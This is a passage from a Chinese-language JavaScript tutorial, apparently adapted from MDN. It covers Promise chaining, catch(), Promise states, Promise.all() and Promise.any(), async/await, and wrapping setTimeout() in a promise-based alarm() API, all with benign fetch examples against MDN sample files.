beans”（“products.json”中第一个产品的名称）。</p><p>等等！还记得上一篇文章吗？我们好像说过，在回调中调用另一个回调会出现多层嵌套的情况？我们是不是还说过，这种“回调地狱”使我们的代码难以理解？这不是也一样吗，只不过变成了用 <code>then()</code> 调用而已？</p><p>当然如此。但 Promise 的优雅之处在于 <em><code>then()</code> 本身也会返回一个 Promise，这个 Promise 将指示 <code>then()</code> 中调用的异步函数的完成状态</em>。这意味着我们可以（当然也应该）把上面的代码改写成这样：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs arcade">const fetchPromise = fetch(<span class="hljs-string">&#x27;https://mdn.github.io/learning-area/javascript/apis/fetching-data/can-store/products.json&#x27;</span>);<br><br>fetchPromise<br>  .then( <span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">return</span> response.json();<br>  &#125;)<br>  .then( <span class="hljs-function"><span class="hljs-params">json</span> =&gt;</span> &#123;<br>    <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(json[<span class="hljs-number">0</span>].name);<br>  &#125;);<br></code></pre></td></tr></table></figure><p>不必在第一个 <code>then()</code> 的处理程序中调用第二个 <code>then()</code>，我们可以直接<em>返回</em> <code>json()</code> 返回的 Promise，并在该返回值上调用第二个 “then()”。这被称为 <strong>Promise 链</strong>，意味着当我们需要连续进行异步函数调用时，我们就可以避免不断嵌套带来的缩进增加。</p><p>在进入下一步之前，还有一件事要补充：我们需要在尝试读取请求之前检查服务器是否接受并处理了该请求。我们将通过检查响应中的状态码来做到这一点，如果状态码不是“OK”，就抛出一个错误：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs arcade">const fetchPromise = fetch(<span class="hljs-string">&#x27;https://mdn.github.io/learning-area/javascript/apis/fetching-data/can-store/products.json&#x27;</span>);<br><br>fetchPromise<br>  .then( <span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (!response.ok) &#123;<br>      throw <span class="hljs-keyword">new</span> Error(<span class="hljs-string">`HTTP error: <span class="hljs-subst">$&#123;response.status&#125;</span>`</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> response.json();<br>  &#125;)<br>  .then( <span class="hljs-function"><span class="hljs-params">json</span> =&gt;</span> &#123;<br>    <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(json[<span class="hljs-number">0</span>].name);<br>  &#125;);<br></code></pre></td></tr></table></figure><h4 id="错误捕获"><a href="#错误捕获" class="headerlink" title="错误捕获"></a>错误捕获</h4><p>这给我们带来了最后一个问题：我们如何处理错误？<code>fetch()</code> API 可能因为很多原因抛出错误（例如，没有网络连接或 URL 本身存在问题），我们也会在服务器返回错误消息时抛出一个错误。</p><p>在上一篇文章中，我们看到在嵌套回调中进行错误处理非常困难，我们需要在每一个嵌套层中单独捕获错误。</p><p><code>Promise</code> 对象提供了一个 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Promise/catch"><code>catch()</code></a> 方法来支持错误处理。这很像 <code>then()</code>：你调用它并传入一个处理函数。然后，当异步操作<em>成功</em>时，传递给 <code>then()</code> 的处理函数被调用，而当异步操作<em>失败</em>时，传递给 <code>catch()</code> 的处理函数被调用。</p><p>如果将 <code>catch()</code> 添加到 Promise 链的末尾，它就可以在任何异步函数失败时被调用。于是，我们就可以将一个操作实现为几个连续的异步函数调用，并在一个地方处理所有错误。</p><p>试试这个版本的 <code>fetch()</code> 代码。我们使用 <code>catch()</code> 添加了一个错误处理函数，并修改了 URL（这样请求就会失败）。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs arcade">const fetchPromise = fetch(<span class="hljs-string">&#x27;bad-scheme://mdn.github.io/learning-area/javascript/apis/fetching-data/can-store/products.json&#x27;</span>);<br><br>fetchPromise<br>  .then( <span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (!response.ok) &#123;<br>      throw <span class="hljs-keyword">new</span> Error(<span class="hljs-string">`HTTP 请求错误：<span class="hljs-subst">$&#123;response.status&#125;</span>`</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> response.json();<br>  &#125;)<br>  .then( <span class="hljs-function"><span class="hljs-params">json</span> =&gt;</span> &#123;<br>    <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(json[<span class="hljs-number">0</span>].name);<br>  &#125;)<br>  .catch( <span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> &#123;<br>    <span class="hljs-built_in">console</span>.error(<span class="hljs-string">`无法获取产品列表：<span class="hljs-subst">$&#123;error&#125;</span>`</span>);<br>  &#125;);<br></code></pre></td></tr></table></figure><p>尝试运行这个版本：你应该会看到 <code>catch()</code> 处理函数输出的错误。</p><h4 id="Promise-术语"><a href="#Promise-术语" class="headerlink" title="Promise 术语"></a>Promise 术语</h4><p>Promise 中有一些具体的术语值得我们弄清楚。</p><p>首先，Promise 有三种状态：</p><ul><li><strong>待定（pending）</strong>：初始状态，既没有被兑现，也没有被拒绝。这是调用 <code>fetch()</code> 返回 Promise 时的状态，此时请求还在进行中。</li><li><strong>已兑现（fulfilled）</strong>：意味着操作成功完成。当 Promise 完成时，它的 <code>then()</code> 处理函数被调用。</li><li><strong>已拒绝（rejected）</strong>：意味着操作失败。当一个 Promise 失败时，它的 <code>catch()</code> 处理函数被调用。</li></ul><p>注意，这里的“成功”或“失败”的含义取决于所使用的 API：例如，<code>fetch()</code> 认为服务器返回一个错误（如<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/404">404 Not Found</a>）时请求成功，但如果网络错误阻止请求被发送，则认为请求失败。</p><p>有时我们用 <strong>已敲定（settled）</strong> 这个词来同时表示 <strong>已兑现（fulfilled）</strong> 和 <strong>已拒绝（rejected）</strong> 两种情况。</p><p>如果一个 Promise 处于已决议（resolved）状态，或者它被“锁定”以跟随另一个 Promise 的状态，那么它就是 <strong>已兑现（fulfilled）</strong>。</p><p>文章 <a href="https://thenewtoys.dev/blog/2021/02/08/lets-talk-about-how-to-talk-about-promises/">Let’s talk about how to talk about promises</a> 对这些术语的细节做了很好的解释。</p><h4 id="合并使用多个-Promise"><a href="#合并使用多个-Promise" class="headerlink" title="合并使用多个 Promise"></a>合并使用多个 Promise</h4><p>当你的操作由几个异步函数组成，而且你需要在开始下一个函数之前完成之前每一个函数时，你需要的就是 Promise 链。但是在其他的一些情况下，你可能需要合并多个异步函数的调用，<code>Promise</code> API 为解决这一问题提供了帮助。</p><p>有时你需要所有的 Promise 都得到实现，但它们并不相互依赖。在这种情况下，将它们一起启动然后在它们全部被兑现后得到通知会更有效率。这里需要 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Promise/all"><code>Promise.all()</code></a> 方法。它接收一个 Promise 数组，并返回一个单一的 Promise。</p><p>由<code>Promise.all()</code>返回的 Promise：</p><ul><li>当且仅当数组中<em>所有</em>的 Promise 都被兑现时，才会通知 <code>then()</code> 处理函数并提供一个包含所有响应的数组，数组中响应的顺序与被传入 <code>all()</code> 的 Promise 的顺序相同。</li><li>会被拒绝——如果数组中有<em>任何一个</em> Promise 被拒绝。此时，<code>catch()</code> 处理函数被调用，并提供被拒绝的 Promise 所抛出的错误。</li></ul><p>譬如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> fetchPromise1 = <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://mdn.github.io/learning-area/javascript/apis/fetching-data/can-store/products.json&#x27;</span>);<br><span class="hljs-keyword">const</span> fetchPromise2 = <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://mdn.github.io/learning-area/javascript/apis/fetching-data/can-store/not-found&#x27;</span>);<br><span class="hljs-keyword">const</span> fetchPromise3 = <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://mdn.github.io/learning-area/javascript/oojs/json/superheroes.json&#x27;</span>);<br><br><span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([fetchPromise1, fetchPromise2, fetchPromise3])<br>  .<span class="hljs-title function_">then</span>( <span class="hljs-function"><span class="hljs-params">responses</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> response <span class="hljs-keyword">of</span> responses) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;response.url&#125;</span>：<span class="hljs-subst">$&#123;response.status&#125;</span>`</span>);<br>    &#125;<br>  &#125;)<br>  .<span class="hljs-title function_">catch</span>( <span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`获取失败：<span class="hljs-subst">$&#123;error&#125;</span>`</span>)<br>  &#125;);<br></code></pre></td></tr></table></figure><p>这里我们向三个不同的 URL 发出三个 <code>fetch()</code> 请求。如果它们都被兑现了，我们将输出每个请求的响应状态。如果其中任何一个被拒绝了，我们将输出失败的情况。</p><p>根据我们提供的 URL，应该所有的请求都会被兑现，尽管因为第二个请求中请求的文件不存在，服务器将返回 <code>404</code>（Not Found）而不是 <code>200</code>（OK）。所以输出应该是：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//m</span>dn.github.io<span class="hljs-regexp">/learning-area/</span>javascript<span class="hljs-regexp">/apis/</span>fetching-data<span class="hljs-regexp">/can-store/</span>products.json：<span class="hljs-number">200</span><br>https:<span class="hljs-regexp">//m</span>dn.github.io<span class="hljs-regexp">/learning-area/</span>javascript<span class="hljs-regexp">/apis/</span>fetching-data<span class="hljs-regexp">/can-store/</span>not-found：<span class="hljs-number">404</span><br>https:<span class="hljs-regexp">//m</span>dn.github.io<span class="hljs-regexp">/learning-area/</span>javascript<span class="hljs-regexp">/oojs/</span>json/superheroes.json：<span class="hljs-number">200</span><br></code></pre></td></tr></table></figure><p>如果我们用一个错误编码的 URL 尝试同样的代码，就像这样：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> fetchPromise1 = <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://mdn.github.io/learning-area/javascript/apis/fetching-data/can-store/products.json&#x27;</span>);<br><span class="hljs-keyword">const</span> fetchPromise2 = <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://mdn.github.io/learning-area/javascript/apis/fetching-data/can-store/not-found&#x27;</span>);<br><span class="hljs-keyword">const</span> fetchPromise3 = <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;bad-scheme://mdn.github.io/learning-area/javascript/oojs/json/superheroes.json&#x27;</span>);<br><br><span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([fetchPromise1, fetchPromise2, fetchPromise3])<br>  .<span class="hljs-title function_">then</span>( <span class="hljs-function"><span class="hljs-params">responses</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> response <span class="hljs-keyword">of</span> responses) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;response.url&#125;</span>：<span class="hljs-subst">$&#123;response.status&#125;</span>`</span>);<br>    &#125;<br>  &#125;)<br>  .<span class="hljs-title function_">catch</span>( <span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`获取失败：<span class="hljs-subst">$&#123;error&#125;</span>`</span>)<br>  &#125;);<br></code></pre></td></tr></table></figure><p>……然后 <code>catch()</code> 处理程序将被运行，我们应该看到像这样的输出：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">获取失败：TypeError: Failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">fetch</span><br></code></pre></td></tr></table></figure><p>有时，你可能需要等待一组 Promise 中的某一个 Promise 的执行，而不关心是哪一个。在这种情况下，你需要 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Promise/any"><code>Promise.any()</code></a>。这就像 <code>Promise.all()</code>，不过在 Promise 数组中的任何一个被兑现时它就会被兑现，如果所有的 Promise 都被拒绝，它也会被拒绝。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs arcade">const fetchPromise1 = fetch(<span class="hljs-string">&#x27;https://mdn.github.io/learning-area/javascript/apis/fetching-data/can-store/products.json&#x27;</span>);<br>const fetchPromise2 = fetch(<span class="hljs-string">&#x27;https://mdn.github.io/learning-area/javascript/apis/fetching-data/can-store/not-found&#x27;</span>);<br>const fetchPromise3 = fetch(<span class="hljs-string">&#x27;https://mdn.github.io/learning-area/javascript/oojs/json/superheroes.json&#x27;</span>);<br><br>Promise.<span class="hljs-built_in">any</span>([fetchPromise1, fetchPromise2, fetchPromise3])<br>  .then( <span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<br>    <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;response.url&#125;</span>：<span class="hljs-subst">$&#123;response.status&#125;</span>`</span>);<br>  &#125;)<br>  .catch( <span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> &#123;<br>    <span class="hljs-built_in">console</span>.error(<span class="hljs-string">`获取失败：<span class="hljs-subst">$&#123;error&#125;</span>`</span>)<br>  &#125;);<br></code></pre></td></tr></table></figure><p>值得注意的是，在这种情况下，我们无法预测哪个获取请求会先被兑现。</p><p>这两个用于组合多个承诺的函数只是额外的 <code>Promise</code> 函数中的两个。要了解其余的内容，参见 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Promise"><code>Promise</code></a> 参考文档。</p><h4 id="async-和-await"><a href="#async-和-await" class="headerlink" title="async 和 await"></a>async 和 await</h4><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/async_function"><code>async</code></a> 关键字为你提供了一种更简单的方法来处理基于异步 Promise 的代码。在一个函数的开头添加 <code>async</code>，就可以使其成为一个异步函数。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">async</span> function <span class="hljs-title">myFunction</span>()</span> &#123;<br>  <span class="hljs-comment">// 这是一个异步函数</span><br>&#125;<br></code></pre></td></tr></table></figure><p>在异步函数中，你可以在调用一个返回 Promise 的函数之前使用 <code>await</code> 关键字。这使得代码在该点上等待，直到 Promise 被完成，这时 Promise 的响应被当作返回值，或者被拒绝的响应被作为错误抛出。</p><p>这使你能够编写像同步代码一样的异步函数。例如，我们可以用它来重写我们的 fetch 示例。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchProducts</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-comment">// 在这一行之后，我们的函数将等待 `fetch()` 调用完成</span><br>    <span class="hljs-comment">// 调用 `fetch()` 将返回一个“响应”或抛出一个错误</span><br>    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://mdn.github.io/learning-area/javascript/apis/fetching-data/can-store/products.json&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`HTTP 请求错误：<span class="hljs-subst">$&#123;response.status&#125;</span>`</span>);<br>    &#125;<br>    <span class="hljs-comment">// 在这一行之后，我们的函数将等待 `response.json()` 的调用完成</span><br>    <span class="hljs-comment">// `response.json()` 调用将返回 JSON 对象或抛出一个错误</span><br>    <span class="hljs-keyword">const</span> json = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(json[<span class="hljs-number">0</span>].<span class="hljs-property">name</span>);<br>  &#125;<br>  <span class="hljs-keyword">catch</span>(error) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`无法获取产品列表：<span class="hljs-subst">$&#123;error&#125;</span>`</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-title function_">fetchProducts</span>();<br></code></pre></td></tr></table></figure><p>这里我们调用 <code>await fetch()</code>，我们的调用者得到的并不是 <code>Promise</code>，而是一个完整的 <code>Response</code> 对象，就好像 <code>fetch()</code> 是一个同步函数一样。</p><p>我们甚至可以使用 <code>try...catch</code> 块来处理错误，就像我们在写同步代码时一样。</p><p>但请注意，这个写法只在异步函数中起作用。异步函数总是返回一个 Pomise，所以你不能做这样的事情：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchProducts</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://mdn.github.io/learning-area/javascript/apis/fetching-data/can-store/products.json&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`HTTP 请求错误：<span class="hljs-subst">$&#123;response.status&#125;</span>`</span>);<br>    &#125;<br>    <span class="hljs-keyword">const</span> json = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>    <span class="hljs-keyword">return</span> json;<br>  &#125;<br>  <span class="hljs-keyword">catch</span>(error) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`无法获取产品列表：<span class="hljs-subst">$&#123;error&#125;</span>`</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> json = <span class="hljs-title function_">fetchProducts</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(json[<span class="hljs-number">0</span>].<span class="hljs-property">name</span>);   <span class="hljs-comment">// json 是一个 Promise 对象，因此这句代码无法正常工作</span><br></code></pre></td></tr></table></figure><p>相反，你需要做一些事情，比如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchProducts</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://mdn.github.io/learning-area/javascript/apis/fetching-data/can-store/products.json&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`HTTP 请求错误：<span class="hljs-subst">$&#123;response.status&#125;</span>`</span>);<br>    &#125;<br>    <span class="hljs-keyword">const</span> json = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>    <span class="hljs-keyword">return</span> json;<br>  &#125;<br>  <span class="hljs-keyword">catch</span>(error) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`无法获取产品列表：<span class="hljs-subst">$&#123;error&#125;</span>`</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> jsonPromise = <span class="hljs-title function_">fetchProducts</span>();<br>jsonPromise.<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">json</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(json[<span class="hljs-number">0</span>].<span class="hljs-property">name</span>));<br></code></pre></td></tr></table></figure><p>你可能会在需要使用 Promise 链地方使用 <code>async</code> 函数，这也使得 Promise 的工作更加直观。</p><p>请记住，就像一个 Promise 链一样，<code>await</code> 强制异步操作以串联的方式完成。如果下一个操作的结果取决于上一个操作的结果，这是必要的，但如果不是这样，像 <code>Promise.all()</code> 这样的操作会有更好的性能。</p><h3 id="3-7-实现基于Promise的API"><a href="#3-7-实现基于Promise的API" class="headerlink" title="3.7 实现基于Promise的API"></a>3.7 实现基于Promise的API</h3><p>通常情况下，当你实现一个基于 promise 的 API 时，你会使用事件、普通回调，或者消息传递模型来包裹一个异步操作。你将会使用一个 <code>Promise</code> 对象来合理的处理操作的成功或者失败。</p><h4 id="实现-alarm-API"><a href="#实现-alarm-API" class="headerlink" title="实现 alarm() API"></a>实现 alarm() API</h4><p>在这个示例中我们将会实现一个基于 promise 的 alarm API，叫做 <code>alarm()</code> 。它将以被唤醒人的名字和一个在人被唤醒前以毫秒为单位的延迟作为参数。在延迟之后，本函数将会发送一个包含需要被唤醒人名字的 “Wake up!” 消息。</p><h4 id="用-setTimeout-包裹"><a href="#用-setTimeout-包裹" class="headerlink" title="用 setTimeout() 包裹"></a>用 setTimeout() 包裹</h4><p>我们将会使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/setTimeout"><code>setTimeout()</code></a> 来实现 <code>alarm()</code> 函数。<code>setTimeout()</code> 以一个回调函数和一个以毫秒为单位的延迟作为参数。当调用 <code>setTimeout()</code> 时，它将启动一个设置为给定延迟的计时器，当时间过期时，它就会调用给定的回调函数。</p><p>在下面的例子中，我们使用一个回调函数和一个 1000 毫秒的延迟调用 <code>setTimeout()</code>：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&lt;button <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;set-alarm&quot;</span>&gt;Set alarm&lt;/button&gt;<br>&lt;<span class="hljs-keyword">div</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;output&quot;</span>&gt;&lt;/<span class="hljs-keyword">div</span>&gt;<br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> output = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;#output&#x27;</span>);<br><span class="hljs-keyword">const</span> button = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;#set-alarm&#x27;</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">setAlarm</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">window</span>.<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    output.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;Wake up!&#x27;</span>;<br>  &#125;, <span class="hljs-number">1000</span>);<br>&#125;<br><br>button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, setAlarm);<br></code></pre></td></tr></table></figure><iframe class="sample-code-frame" title="用 setTimeout() 包裹 sample" id="frame_用_settimeout_包裹" width="600" height="100" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/JavaScript/Asynchronous/Implementing_a_promise-based_API/_sample_.%E7%94%A8_settimeout_%E5%8C%85%E8%A3%B9.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><h4 id="Promise-构造器"><a href="#Promise-构造器" class="headerlink" title="Promise() 构造器"></a>Promise() 构造器</h4><p>我们的 <code>alarm()</code> 函数返回一个在定时器过期时才会被兑现的 <code>Promise</code>。它将会传递一个 “Wake up!” 消息到 <code>then()</code> 处理器中，也会在当调用者提供一个负延迟值时拒绝这个 promise。</p><p>这里的关键组件是 <code>Promise()</code> 构造器。<code>Promise()</code> 构造器使用单个函数作为参数。我们把这个函数称作<code>执行器</code>（executor）。当你创建一个新的 promise 的时候你需要实现这个执行器。</p><p>这个执行器本身采用两个参数，这两个参数都是函数，通常被称作 <code>resolve</code> 和 <code>reject</code>。在你的执行器实现里，你调用原始的异步函数。如果异步函数成功了，就调用 <code>resolve</code>，如果失败了，就调用 <code>reject</code>。如果执行器函数抛出了一个错误，<code>reject</code> 会被自动调用。你可以将任何类型的单个参数传递到 <code>resolve</code> 和 <code>reject</code> 中。</p><p>所以我们可以像下面这样实现 <code>alarm()</code>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">alarm</span>(<span class="hljs-params">person, delay</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (delay &lt; <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Alarm delay must not be negative&#x27;</span>);<br>    &#125;<br>    <span class="hljs-variable language_">window</span>.<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-title function_">resolve</span>(<span class="hljs-string">`Wake up, <span class="hljs-subst">$&#123;person&#125;</span>!`</span>);<br>    &#125;, delay);<br>  